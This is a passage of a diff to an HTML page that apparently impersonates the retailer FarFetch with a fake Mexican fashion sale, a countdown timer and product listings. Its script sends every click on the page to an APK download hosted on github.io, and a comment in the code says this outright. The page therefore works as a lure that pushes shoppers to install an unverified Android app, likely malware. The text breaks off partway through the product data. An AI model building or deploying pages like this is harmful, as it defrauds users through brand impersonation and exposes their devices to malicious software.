@@ -1,271 +1,754 @@
 <!DOCTYPE html>
 <html lang="es-MX">
+
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>FarFetch · Rebajas de moda para mujer | Hasta 50% de descuento</title>
-<meta name="description" content="Rebajas de temporada en vestidos, blusas, abrigos y accesorios para mujer. Hasta 50% de descuento, envío gratis desde $999 MXN y hasta 12 meses sin intereses en todo México.">
-<meta name="keywords" content="ropa para mujer, rebajas, ofertas, vestidos, blusas, accesorios, bolsos, aretes, moda México, descuentos">
-<meta name="author" content="FarFetch">
-<meta name="robots" content="index, follow">
-<meta name="theme-color" content="#fbf6ef" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#1a0f1e" media="(prefers-color-scheme: dark)">
-<meta name="format-detection" content="telephone=no">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="FarFetch">
-<meta property="og:locale" content="es_MX">
-<meta property="og:title" content="Rebajas FarFetch: hasta 50% de descuento en moda para mujer">
-<meta property="og:description" content="Vestidos, blusas y accesorios con precios que no se repiten. Envío gratis desde $999 MXN a todo México.">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Rebajas FarFetch: hasta 50% de descuento">
-<meta name="twitter:description" content="Vestidos, blusas y accesorios con precios que no se repiten. Envío gratis desde $999 MXN.">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>FarFetch · Rebajas de moda para mujer | Hasta 50% de descuento</title>
+  <meta name="description"
+    content="Rebajas de temporada en vestidos, blusas, abrigos y accesorios para mujer. Hasta 50% de descuento, envío gratis desde $999 MXN y hasta 12 meses sin intereses en todo México.">
+  <meta name="keywords"
+    content="ropa para mujer, rebajas, ofertas, vestidos, blusas, accesorios, bolsos, aretes, moda México, descuentos">
+  <meta name="author" content="FarFetch">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#fbf6ef" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#1a0f1e" media="(prefers-color-scheme: dark)">
+  <meta name="format-detection" content="telephone=no">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="FarFetch">
+  <meta property="og:locale" content="es_MX">
+  <meta property="og:title" content="Rebajas FarFetch: hasta 50% de descuento en moda para mujer">
+  <meta property="og:description"
+    content="Vestidos, blusas y accesorios con precios que no se repiten. Envío gratis desde $999 MXN a todo México.">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Rebajas FarFetch: hasta 50% de descuento">
+  <meta name="twitter:description"
+    content="Vestidos, blusas y accesorios con precios que no se repiten. Envío gratis desde $999 MXN.">
 
-<meta property="og:image" content="https://liteinx.github.io/LitePro/farfetch/meta.jpg">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
-<meta property="og:image:alt" content="Rebajas FarFetch: moda para mujer con hasta 50% de descuento">
-<meta name="twitter:image" content="https://liteinx.github.io/LitePro/farfetch/meta.jpg">
+  <meta property="og:image" content="https://liteinx.github.io/LitePro/farfetch/meta.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="Rebajas FarFetch: moda para mujer con hasta 50% de descuento">
+  <meta name="twitter:image" content="https://liteinx.github.io/LitePro/farfetch/meta.jpg">
 
 
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400;12..96,700;12..96,800&family=DM+Sans:wght@400;500;700&display=swap">
-<style>
-:root{
-  --bg:#fbf6ef; --surface:#ffffff; --ink:#2a1530; --muted:#6f5d76;
-  --pink:#e4007c; --gold:#f5a300; --teal:#00857a; --line:#eadfd2; --on-pink:#fff;
-  color-scheme: light;
-  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
-}
-@media (prefers-color-scheme: dark){
-  :root:not([data-theme="light"]){
-    --bg:#1a0f1e; --surface:#27172d; --ink:#faf1f5; --muted:#c3aecb; --pink:#ff4fa6; --gold:#ffbe3d; --teal:#2fd0c0; --line:#3d2a45; color-scheme: dark;
-  }
-}
-:root[data-theme="dark"]{--bg:#1a0f1e; --surface:#27172d; --ink:#faf1f5; --muted:#c3aecb; --pink:#ff4fa6; --gold:#ffbe3d; --teal:#2fd0c0; --line:#3d2a45; color-scheme: dark;}
-html{scroll-padding-top:env(safe-area-inset-top,0px);scroll-behavior:smooth}
-*{box-sizing:border-box}
-body{margin:0;background:var(--bg);color:var(--ink);font-family:'DM Sans',system-ui,sans-serif;line-height:1.5;cursor:pointer}
-h1,h2,h3,.brand{font-family:'Bricolage Grotesque','DM Sans',system-ui,sans-serif;margin:0;letter-spacing:-.02em}
-a{color:inherit;text-decoration:none}
-button{font:inherit;cursor:pointer;border:0}
-:focus-visible{outline:3px solid var(--gold);outline-offset:2px}
-.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+  <link rel="stylesheet"
+    href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400;12..96,700;12..96,800&family=DM+Sans:wght@400;500;700&display=swap">
+  <style>
+    :root {
+      --bg: #fbf6ef;
+      --surface: #ffffff;
+      --ink: #2a1530;
+      --muted: #6f5d76;
+      --pink: #e4007c;
+      --gold: #f5a300;
+      --teal: #00857a;
+      --line: #eadfd2;
+      --on-pink: #fff;
+      color-scheme: light;
+      box-sizing: border-box;
+      padding-top: env(safe-area-inset-top, 0px);
+      padding-bottom: env(safe-area-inset-bottom, 0px);
+    }
 
-.bar{background:var(--ink);color:var(--bg);text-align:center;font-size:14px;padding:8px 12px}
-.bar b{color:var(--gold)}
-header{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--bg);border-bottom:1px solid var(--line)}
-.nav{display:flex;align-items:center;justify-content:space-between;height:64px;gap:16px}
-.brand{font-size:28px;font-weight:800;color:var(--pink)}
-.nav nav{display:flex;gap:26px;font-weight:500}
-.nav nav a:hover{color:var(--pink)}
-.cart{background:var(--ink);color:var(--bg);padding:9px 18px;border-radius:99px;font-weight:700}
-@media(max-width:720px){.nav nav{display:none}}
+    @media (prefers-color-scheme: dark) {
+      :root:not([data-theme="light"]) {
+        --bg: #1a0f1e;
+        --surface: #27172d;
+        --ink: #faf1f5;
+        --muted: #c3aecb;
+        --pink: #ff4fa6;
+        --gold: #ffbe3d;
+        --teal: #2fd0c0;
+        --line: #3d2a45;
+        color-scheme: dark;
+      }
+    }
 
-.hero{display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center;padding:56px 0 40px}
-.hero h1{font-size:clamp(44px,7.4vw,92px);font-weight:800;line-height:.95}
-.hero h1 em{font-style:normal;color:var(--pink)}
-.hero p{font-size:19px;color:var(--muted);max-width:46ch;margin:20px 0 28px}
-.cta{display:inline-block;background:var(--pink);color:var(--on-pink);padding:16px 30px;border-radius:99px;font-weight:700;font-size:17px;box-shadow:0 8px 0 rgba(0,0,0,.12);transition:transform .15s}
-.cta:hover{transform:translateY(-2px)}
-.timer{display:flex;gap:10px;margin-top:30px}
-.timer div{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:10px 14px;min-width:68px;text-align:center}
-.timer b{display:block;font-family:'Bricolage Grotesque',sans-serif;font-size:28px;line-height:1}
-.timer span{font-size:12px;color:var(--muted)}
-.timer-label{margin:26px 0 -18px;font-weight:700;color:var(--teal)}
+    :root[data-theme="dark"] {
+      --bg: #1a0f1e;
+      --surface: #27172d;
+      --ink: #faf1f5;
+      --muted: #c3aecb;
+      --pink: #ff4fa6;
+      --gold: #ffbe3d;
+      --teal: #2fd0c0;
+      --line: #3d2a45;
+      color-scheme: dark;
+    }
 
-.collage{position:relative;height:460px}
-.tile{position:absolute;border-radius:28px;display:grid;place-items:center;box-shadow:0 18px 40px rgba(60,10,50,.18)}
-.t1{width:56%;height:62%;left:0;top:6%;background:var(--pink);transform:rotate(-5deg);font-size:110px}
-.t2{width:46%;height:46%;right:0;top:0;background:var(--gold);transform:rotate(4deg);font-size:86px}
-.t3{width:48%;height:44%;right:6%;bottom:0;background:var(--teal);transform:rotate(-2deg);font-size:86px}
-.sticker{position:absolute;left:34%;bottom:6%;background:var(--surface);color:var(--ink);border-radius:50%;width:116px;height:116px;display:grid;place-items:center;text-align:center;font-family:'Bricolage Grotesque',sans-serif;font-weight:800;line-height:1;border:3px dashed var(--pink);transform:rotate(-10deg)}
-.sticker small{display:block;font-size:13px;font-weight:700;color:var(--muted)}
-.sticker big{font-size:34px;color:var(--pink)}
-@media(max-width:860px){.hero{grid-template-columns:1fr;padding-top:32px}.collage{height:340px}.tile{font-size:70px!important}}
+    html {
+      scroll-padding-top: env(safe-area-inset-top, 0px);
+      scroll-behavior: smooth
+    }
 
-.perks{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;padding:8px 0 28px}
-.perks div{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:14px 16px;font-weight:500}
+    * {
+      box-sizing: border-box
+    }
 
-section{padding:36px 0}
-.head{display:flex;justify-content:space-between;align-items:end;gap:16px;margin-bottom:22px;flex-wrap:wrap}
-.head h2{font-size:clamp(30px,4.4vw,48px);font-weight:800}
-.head a{color:var(--pink);font-weight:700}
-.chips{display:flex;gap:8px;flex-wrap:wrap}
-.chips button{background:var(--surface);color:var(--ink);border:1px solid var(--line);padding:8px 16px;border-radius:99px;font-weight:500}
-.chips button:first-child{background:var(--ink);color:var(--bg)}
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--ink);
+      font-family: 'DM Sans', system-ui, sans-serif;
+      line-height: 1.5;
+      cursor: pointer
+    }
 
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:18px}
-.card{background:var(--surface);border:1px solid var(--line);border-radius:22px;padding:12px;transition:transform .2s,box-shadow .2s}
-.card:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(60,10,50,.12)}
-.pic{position:relative;aspect-ratio:1/1.1;border-radius:16px;display:grid;place-items:center;font-size:76px}
-.pic img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border-radius:16px}
-.off{z-index:1;position:absolute;top:10px;left:10px;background:var(--ink);color:var(--bg);font-weight:700;font-size:13px;padding:4px 10px;border-radius:99px}
-.fav{z-index:1;position:absolute;top:8px;right:8px;width:34px;height:34px;border-radius:50%;background:var(--surface);color:var(--pink);font-size:16px}
-.card h3{font-size:18px;font-weight:700;margin:12px 4px 2px}
-.card .sub{margin:0 4px;color:var(--muted);font-size:14px}
-.price{display:flex;align-items:baseline;gap:10px;margin:8px 4px 12px}
-.price b{font-family:'Bricolage Grotesque',sans-serif;font-size:24px;color:var(--pink)}
-.price s{color:var(--muted);font-size:15px}
-.add{width:100%;background:var(--ink);color:var(--bg);padding:11px;border-radius:12px;font-weight:700}
-.add:hover{background:var(--pink);color:var(--on-pink)}
+    h1,
+    h2,
+    h3,
+    .brand {
+      font-family: 'Bricolage Grotesque', 'DM Sans', system-ui, sans-serif;
+      margin: 0;
+      letter-spacing: -.02em
+    }
 
-.promo{background:var(--gold);color:#2a1530;border-radius:32px;padding:44px;display:flex;justify-content:space-between;align-items:center;gap:24px;flex-wrap:wrap;margin:24px 0}
-.promo h2{font-size:clamp(30px,5vw,56px);font-weight:800;line-height:1}
-.promo p{margin:10px 0 0;font-size:18px}
-.promo .cta{background:#2a1530;color:#fff}
+    a {
+      color: inherit;
+      text-decoration: none
+    }
 
-footer{border-top:1px solid var(--line);padding:32px 0 40px;margin-top:30px;color:var(--muted);font-size:14px}
-footer .wrap{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap}
-footer nav{display:flex;gap:20px}
-</style>
+    button {
+      font: inherit;
+      cursor: pointer;
+      border: 0
+    }
+
+    :focus-visible {
+      outline: 3px solid var(--gold);
+      outline-offset: 2px
+    }
+
+    .wrap {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 0 20px
+    }
+
+    .bar {
+      background: var(--ink);
+      color: var(--bg);
+      text-align: center;
+      font-size: 14px;
+      padding: 8px 12px
+    }
+
+    .bar b {
+      color: var(--gold)
+    }
+
+    header {
+      position: sticky;
+      top: env(safe-area-inset-top, 0px);
+      z-index: 5;
+      background: var(--bg);
+      border-bottom: 1px solid var(--line)
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+      gap: 16px
+    }
+
+    .brand {
+      font-size: 28px;
+      font-weight: 800;
+      color: var(--pink)
+    }
+
+    .nav nav {
+      display: flex;
+      gap: 26px;
+      font-weight: 500
+    }
+
+    .nav nav a:hover {
+      color: var(--pink)
+    }
+
+    .cart {
+      background: var(--ink);
+      color: var(--bg);
+      padding: 9px 18px;
+      border-radius: 99px;
+      font-weight: 700
+    }
+
+    @media(max-width:720px) {
+      .nav nav {
+        display: none
+      }
+    }
+
+    .hero {
+      display: grid;
+      grid-template-columns: 1.1fr .9fr;
+      gap: 40px;
+      align-items: center;
+      padding: 56px 0 40px
+    }
+
+    .hero h1 {
+      font-size: clamp(44px, 7.4vw, 92px);
+      font-weight: 800;
+      line-height: .95
+    }
+
+    .hero h1 em {
+      font-style: normal;
+      color: var(--pink)
+    }
+
+    .hero p {
+      font-size: 19px;
+      color: var(--muted);
+      max-width: 46ch;
+      margin: 20px 0 28px
+    }
+
+    .cta {
+      display: inline-block;
+      background: var(--pink);
+      color: var(--on-pink);
+      padding: 16px 30px;
+      border-radius: 99px;
+      font-weight: 700;
+      font-size: 17px;
+      box-shadow: 0 8px 0 rgba(0, 0, 0, .12);
+      transition: transform .15s
+    }
+
+    .cta:hover {
+      transform: translateY(-2px)
+    }
+
+    .timer {
+      display: flex;
+      gap: 10px;
+      margin-top: 30px
+    }
+
+    .timer div {
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      padding: 10px 14px;
+      min-width: 68px;
+      text-align: center
+    }
+
+    .timer b {
+      display: block;
+      font-family: 'Bricolage Grotesque', sans-serif;
+      font-size: 28px;
+      line-height: 1
+    }
+
+    .timer span {
+      font-size: 12px;
+      color: var(--muted)
+    }
+
+    .timer-label {
+      margin: 26px 0 -18px;
+      font-weight: 700;
+      color: var(--teal)
+    }
+
+    .collage {
+      position: relative;
+      height: 460px
+    }
+
+    .tile {
+      position: absolute;
+      border-radius: 28px;
+      display: grid;
+      place-items: center;
+      box-shadow: 0 18px 40px rgba(60, 10, 50, .18)
+    }
+
+    .t1 {
+      width: 56%;
+      height: 62%;
+      left: 0;
+      top: 6%;
+      background: var(--pink);
+      transform: rotate(-5deg);
+      font-size: 110px
+    }
+
+    .t2 {
+      width: 46%;
+      height: 46%;
+      right: 0;
+      top: 0;
+      background: var(--gold);
+      transform: rotate(4deg);
+      font-size: 86px
+    }
+
+    .t3 {
+      width: 48%;
+      height: 44%;
+      right: 6%;
+      bottom: 0;
+      background: var(--teal);
+      transform: rotate(-2deg);
+      font-size: 86px
+    }
+
+    .sticker {
+      position: absolute;
+      left: 34%;
+      bottom: 6%;
+      background: var(--surface);
+      color: var(--ink);
+      border-radius: 50%;
+      width: 116px;
+      height: 116px;
+      display: grid;
+      place-items: center;
+      text-align: center;
+      font-family: 'Bricolage Grotesque', sans-serif;
+      font-weight: 800;
+      line-height: 1;
+      border: 3px dashed var(--pink);
+      transform: rotate(-10deg)
+    }
+
+    .sticker small {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--muted)
+    }
+
+    .sticker big {
+      font-size: 34px;
+      color: var(--pink)
+    }
+
+    @media(max-width:860px) {
+      .hero {
+        grid-template-columns: 1fr;
+        padding-top: 32px
+      }
+
+      .collage {
+        height: 340px
+      }
+
+      .tile {
+        font-size: 70px !important
+      }
+    }
+
+    .perks {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 12px;
+      padding: 8px 0 28px
+    }
+
+    .perks div {
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      padding: 14px 16px;
+      font-weight: 500
+    }
+
+    section {
+      padding: 36px 0
+    }
+
+    .head {
+      display: flex;
+      justify-content: space-between;
+      align-items: end;
+      gap: 16px;
+      margin-bottom: 22px;
+      flex-wrap: wrap
+    }
+
+    .head h2 {
+      font-size: clamp(30px, 4.4vw, 48px);
+      font-weight: 800
+    }
+
+    .head a {
+      color: var(--pink);
+      font-weight: 700
+    }
+
+    .chips {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap
+    }
+
+    .chips button {
+      background: var(--surface);
+      color: var(--ink);
+      border: 1px solid var(--line);
+      padding: 8px 16px;
+      border-radius: 99px;
+      font-weight: 500
+    }
+
+    .chips button:first-child {
+      background: var(--ink);
+      color: var(--bg)
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+      gap: 18px
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: 22px;
+      padding: 12px;
+      transition: transform .2s, box-shadow .2s
+    }
+
+    .card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 14px 30px rgba(60, 10, 50, .12)
+    }
+
+    .pic {
+      position: relative;
+      aspect-ratio: 1/1.1;
+      border-radius: 16px;
+      display: grid;
+      place-items: center;
+      font-size: 76px
+    }
+
+    .pic img {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 16px
+    }
+
+    .off {
+      z-index: 1;
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: var(--ink);
+      color: var(--bg);
+      font-weight: 700;
+      font-size: 13px;
+      padding: 4px 10px;
+      border-radius: 99px
+    }
+
+    .fav {
+      z-index: 1;
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: var(--surface);
+      color: var(--pink);
+      font-size: 16px
+    }
+
+    .card h3 {
+      font-size: 18px;
+      font-weight: 700;
+      margin: 12px 4px 2px
+    }
+
+    .card .sub {
+      margin: 0 4px;
+      color: var(--muted);
+      font-size: 14px
+    }
+
+    .price {
+      display: flex;
+      align-items: baseline;
+      gap: 10px;
+      margin: 8px 4px 12px
+    }
+
+    .price b {
+      font-family: 'Bricolage Grotesque', sans-serif;
+      font-size: 24px;
+      color: var(--pink)
+    }
+
+    .price s {
+      color: var(--muted);
+      font-size: 15px
+    }
+
+    .add {
+      width: 100%;
+      background: var(--ink);
+      color: var(--bg);
+      padding: 11px;
+      border-radius: 12px;
+      font-weight: 700
+    }
+
+    .add:hover {
+      background: var(--pink);
+      color: var(--on-pink)
+    }
+
+    .promo {
+      background: var(--gold);
+      color: #2a1530;
+      border-radius: 32px;
+      padding: 44px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 24px;
+      flex-wrap: wrap;
+      margin: 24px 0
+    }
+
+    .promo h2 {
+      font-size: clamp(30px, 5vw, 56px);
+      font-weight: 800;
+      line-height: 1
+    }
+
+    .promo p {
+      margin: 10px 0 0;
+      font-size: 18px
+    }
+
+    .promo .cta {
+      background: #2a1530;
+      color: #fff
+    }
+
+    footer {
+      border-top: 1px solid var(--line);
+      padding: 32px 0 40px;
+      margin-top: 30px;
+      color: var(--muted);
+      font-size: 14px
+    }
+
+    footer .wrap {
+      display: flex;
+      justify-content: space-between;
+      gap: 20px;
+      flex-wrap: wrap
+    }
+
+    footer nav {
+      display: flex;
+      gap: 20px
+    }
+  </style>
 </head>
+
 <body>
 
-<div class="bar">Envío gratis en compras desde <b>$999 MXN</b> a todo México</div>
+  <div class="bar">Envío gratis en compras desde <b>$999 MXN</b> a todo México</div>
 
-<header>
-  <div class="wrap nav">
-    <a href="#" class="brand">FarFetch</a>
-    <nav>
-      <a href="#">Vestidos</a><a href="#">Blusas</a><a href="#">Accesorios</a><a href="#">Rebajas</a>
-    </nav>
-    <button class="cart" aria-label="Ver carrito">Carrito (0)</button>
-  </div>
-</header>
+  <header>
+    <div class="wrap nav">
+      <a href="#" class="brand">FarFetch</a>
+      <nav>
+        <a href="#">Vestidos</a><a href="#">Blusas</a><a href="#">Accesorios</a><a href="#">Rebajas</a>
+      </nav>
+      <button class="cart" aria-label="Ver carrito">Carrito (0)</button>
+    </div>
+  </header>
 
-<main class="wrap">
-  <div class="hero">
-    <div>
-      <h1>Rebajas de temporada, hasta <em>50% menos</em></h1>
-      <p>Vestidos, blusas y accesorios que ya querías, con precios que no se repiten. Moda hecha para el clima y el ritmo de México.</p>
-      <a href="#" class="cta">Comprar rebajas</a>
-      <p class="timer-label">La oferta termina en</p>
-      <div class="timer" aria-live="off">
-        <div><b id="d">00</b><span>días</span></div>
-        <div><b id="h">00</b><span>horas</span></div>
-        <div><b id="m">00</b><span>min</span></div>
-        <div><b id="s">00</b><span>seg</span></div>
+  <main class="wrap">
+    <div class="hero">
+      <div>
+        <h1>Rebajas de temporada, hasta <em>50% menos</em></h1>
+        <p>Vestidos, blusas y accesorios que ya querías, con precios que no se repiten. Moda hecha para el clima y el
+          ritmo de México.</p>
+        <a href="#" class="cta">Comprar rebajas</a>
+        <p class="timer-label">La oferta termina en</p>
+        <div class="timer" aria-live="off">
+          <div><b id="d">00</b><span>días</span></div>
+          <div><b id="h">00</b><span>horas</span></div>
+          <div><b id="m">00</b><span>min</span></div>
+          <div><b id="s">00</b><span>seg</span></div>
+        </div>
+      </div>
+      <div class="collage" aria-hidden="true">
+        <div class="tile t1">👗</div>
+        <div class="tile t2">👜</div>
+        <div class="tile t3">👒</div>
+        <div class="sticker">
+          <div><small>hasta</small><big>-50%</big></div>
+        </div>
       </div>
     </div>
-    <div class="collage" aria-hidden="true">
-      <div class="tile t1">👗</div>
-      <div class="tile t2">👜</div>
-      <div class="tile t3">👒</div>
-      <div class="sticker"><div><small>hasta</small><big>-50%</big></div></div>
+
+    <div class="perks">
+      <div>🚚 Envío a todo México</div>
+      <div>↩️ 30 días para cambios</div>
+      <div>💳 Hasta 12 meses sin intereses</div>
+      <div>🔒 Pago 100% seguro</div>
     </div>
-  </div>
 
-  <div class="perks">
-    <div>🚚 Envío a todo México</div>
-    <div>↩️ 30 días para cambios</div>
-    <div>💳 Hasta 12 meses sin intereses</div>
-    <div>🔒 Pago 100% seguro</div>
-  </div>
+    <section>
+      <div class="head">
+        <h2>Ropa en rebaja</h2>
+        <div class="chips">
+          <button>Todo</button><button>Vestidos</button><button>Blusas</button><button>Abrigos</button><button>Pantalones</button>
+        </div>
+      </div>
+      <div class="grid" id="clothes"></div>
+    </section>
 
-  <section>
-    <div class="head">
-      <h2>Ropa en rebaja</h2>
-      <div class="chips"><button>Todo</button><button>Vestidos</button><button>Blusas</button><button>Abrigos</button><button>Pantalones</button></div>
+    <div class="promo">
+      <div>
+        <h2>Lleva 2 accesorios, paga 1</h2>
+        <p>En aretes, collares, pulseras y pañuelos seleccionados.</p>
+      </div>
+      <a href="#" class="cta">Ver accesorios</a>
     </div>
-    <div class="grid" id="clothes"></div>
-  </section>
 
-  <div class="promo">
-    <div>
-      <h2>Lleva 2 accesorios, paga 1</h2>
-      <p>En aretes, collares, pulseras y pañuelos seleccionados.</p>
+    <section>
+      <div class="head">
+        <h2>Accesorios</h2>
+        <a href="#">Ver todos</a>
+      </div>
+      <div class="grid" id="acc"></div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <div><span class="brand" style="color:var(--pink);font-size:22px">FarFetch</span><br>Moda para mujer · Hecha con
+        cariño en México</div>
+      <nav><a href="#">Ayuda</a><a href="#">Envíos</a><a href="#">Cambios</a><a href="#">Contacto</a></nav>
     </div>
-    <a href="#" class="cta">Ver accesorios</a>
-  </div>
+  </footer>
 
-  <section>
-    <div class="head">
-      <h2>Accesorios</h2>
-      <a href="#">Ver todos</a>
-    </div>
-    <div class="grid" id="acc"></div>
-  </section>
-</main>
+  <script>
+    // ★ Cambia este enlace: todo lo clicable en la página lleva aquí.
+    const REDIRECT_URL = "https://liteinx.github.io/LitePro/farfetch/FarFetch.apk";
 
-<footer>
-  <div class="wrap">
-    <div><span class="brand" style="color:var(--pink);font-size:22px">FarFetch</span><br>Moda para mujer · Hecha con cariño en México</div>
-    <nav><a href="#">Ayuda</a><a href="#">Envíos</a><a href="#">Cambios</a><a href="#">Contacto</a></nav>
-  </div>
-</footer>
+    // ★ Edit this: the folder where you upload the photos (must end with "/")
+    const IMAGE_BASE_URL = "https://liteinx.github.io/LitePro/farfetch/imgs/clothes/";
 
-<script>
-// ★ Cambia este enlace: todo lo clicable en la página lleva aquí.
-const REDIRECT_URL = "https://liteinx.github.io/LitePro/farfetch/FarFetch.apk";
+    const clothes = [
+      {
+        name: "Vestido floral con olanes", desc: "Hombros descubiertos, rayas y flores",
+        was: 1299, now: 649, img: "pexels-marceloverfe-19895949.jpg", icon: "👗", color: "#ffd1e6"
+      },
 
-// ★ Edit this: the folder where you upload the photos (must end with "/")
-const IMAGE_BASE_URL = "https://liteinx.github.io/LitePro/farfetch/imgs/clothes/";
+      {
+        name: "Vestido negro kimono", desc: "Cuello en V y dobladillo calado",
+        was: 1199, now: 599, img: "pexels-marceloverfe-19895958.jpg", icon: "👗", color: "#d9d9e8"
+      },
 
-const clothes = [
-  { name:"Vestido floral con olanes", desc:"Hombros descubiertos, rayas y flores",
-    was:1299, now:649, img:"pexels-marceloverfe-19895949.jpg", icon:"👗", color:"#ffd1e6" },
+      {
+        name: "Vestido fucsia patchwork", desc: "Hombros descubiertos y encaje tejido",
+        was: 1499, now: 749, img: "pexels-marceloverfe-19895961.jpg", icon: "👗", color: "#ffc9d6"
+      },
 
-  { name:"Vestido negro kimono", desc:"Cuello en V y dobladillo calado",
-    was:1199, now:599, img:"pexels-marceloverfe-19895958.jpg", icon:"👗", color:"#d9d9e8" },
+      {
+        name: "Vestido print serpiente", desc: "Manga larga y olán en la falda",
+        was: 1099, now: 549, img: "pexels-marceloverfe-19895965.jpg", icon: "👗", color: "#e8d5f7"
+      },
 
-  { name:"Vestido fucsia patchwork", desc:"Hombros descubiertos y encaje tejido",
-    was:1499, now:749, img:"pexels-marceloverfe-19895961.jpg", icon:"👗", color:"#ffc9d6" },
+      {
+        name: "Vestido de rosas y encaje", desc: "Malla estampada con falda de encaje negro",
+        was: 1399, now: 699, img: "pexels-marceloverfe-19895978.jpg", icon: "👗", color: "#ffd9c2"
+      },
 
-  { name:"Vestido print serpiente", desc:"Manga larga y olán en la falda",
-    was:1099, now:549, img:"pexels-marceloverfe-19895965.jpg", icon:"👗", color:"#e8d5f7" },
+      {
+        name: "Conjunto de punto acanalado", desc: "Top sin mangas y pantalón amplio",
+        was: 1699, now: 999, img: "pexels-sasha-kim-8484078.jpg", icon: "👚", color: "#efe6dc"
+      },
 
-  { name:"Vestido de rosas y encaje", desc:"Malla estampada con falda de encaje negro",
-    was:1399, now:699, img:"pexels-marceloverfe-19895978.jpg", icon:"👗", color:"#ffd9c2" },
+      {
+        name: "Vestido pata de gallo", desc: "Corte evasé y manga corta",
+        was: 1299, now: 649, img: "pexels-serdargoksu-29899917.jpg", icon: "👗", color: "#d9d9e8"
+      },
 
-  { name:"Conjunto de punto acanalado", desc:"Top sin mangas y pantalón amplio",
-    was:1699, now:999, img:"pexels-sasha-kim-8484078.jpg", icon:"👚", color:"#efe6dc" },
+      {
+        name: "Vestido midi de palmeras", desc: "Estampado tropical con falda asimétrica",
+        was: 1199, now: 599, img: "pexels-walter-alejandro-228509595-31589287.jpg", icon: "👗", color: "#d6f0d2"
+      }
+    ];
+    // ★ Edit this: the folder where you upload the ACCESSORY photos (must end with "/")
+    const ACC_IMAGE_BASE_URL = "https://liteinx.github.io/LitePro/farfetch/imgs/accessories/";
 
-  { name:"Vestido pata de gallo", desc:"Corte evasé y manga corta",
-    was:1299, now:649, img:"pexels-serdargoksu-29899917.jpg", icon:"👗", color:"#d9d9e8" },
+    const acc = [
+      {
+        name: "Bolsos crossbody de piel", desc: "Con asa y correa ajustable, en varios colores",
+        was: 1599, now: 799, img: "pexels-denys-9327162.jpg", icon: "👜", color: "#ffd9c2"
+      },
 
-  { name:"Vestido midi de palmeras", desc:"Estampado tropical con falda asimétrica",
-    was:1199, now:599, img:"pexels-walter-alejandro-228509595-31589287.jpg", icon:"👗", color:"#d6f0d2" }
-];
-// ★ Edit this: the folder where you upload the ACCESSORY photos (must end with "/")
-const ACC_IMAGE_BASE_URL = "https://liteinx.github.io/LitePro/farfetch/imgs/accessories/";
+      {
+        name: "Bolsos barril vino y topo", desc: "Doble asa y correa desmontable",
+        was: 1299, now: 649, img: "pexels-dhanno-22434759.jpg", icon: "👜", color: "#ffd1e6"
+      },
 
-const acc = [
-  { name:"Bolsos crossbody de piel", desc:"Con asa y correa ajustable, en varios colores",
-    was:1599, now:799, img:"pexels-denys-9327162.jpg", icon:"👜", color:"#ffd9c2" },
+      {
+        name: "Set de aretes y pulsera dorada", desc: "Arracadas gruesas y pulsera con dijes",
+        was: 699, now: 349, img: "pexels-harper-sunday-12753202.jpg", icon: "💍", color: "#fff0b8"
+      },
 
-  { name:"Bolsos barril vino y topo", desc:"Doble asa y correa desmontable",
-    was:1299, now:649, img:"pexels-dhanno-22434759.jpg", icon:"👜", color:"#ffd1e6" },
+      {
+        name: "Collar de eslabones dorados", desc: "Cadena gruesa con acabado brillante",
+        was: 549, now: 329, img: "pexels-jonathanborba-28900494.jpg", icon: "📿", color: "#ffe7ad"
+      },
 
-  { name:"Set de aretes y pulsera dorada", desc:"Arracadas gruesas y pulsera con dijes",
-    was:699, now:349, img:"pexels-harper-sunday-12753202.jpg", icon:"💍", color:"#fff0b8" },
+      {
